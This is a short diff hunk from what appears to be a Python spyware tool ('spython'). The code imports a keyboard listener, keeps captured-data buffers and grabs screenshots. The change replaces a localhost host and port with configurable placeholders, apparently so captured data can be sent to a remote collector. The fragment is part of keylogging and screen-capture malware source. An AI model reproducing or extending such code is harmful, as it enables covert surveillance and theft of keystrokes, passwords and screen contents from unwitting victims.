@@ -13,8 +13,8 @@ from pynput import keyboard
 __aplhanum = list(string.ascii_letters+string.digits)
 __data = []
 __add_data = ""
-HOST="127.0.0.1"
-PORT=5000
+HOST= SPYTHON_HOST
+PORT= SPYTHON_PORT 
 IMAGE_NAME = "img.jpeg"
 def __screenshot():
    image = ImageGrab.grab()
